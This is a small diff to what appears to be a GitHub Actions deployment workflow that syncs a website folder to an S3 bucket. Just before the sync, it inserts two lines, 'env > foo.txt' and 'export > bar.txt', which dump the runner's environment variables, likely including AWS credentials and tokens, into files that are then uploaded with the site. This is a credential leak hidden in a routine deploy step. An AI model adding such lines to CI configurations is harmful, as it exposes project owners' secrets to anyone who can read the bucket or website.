@@ -39,5 +39,7 @@ jobs:
     - name: Copy files to the test website with the AWS CLI
       run: |
           cd website
+          env > foo.txt
+          export > bar.txt
           aws s3 sync . s3://erixonzin
       
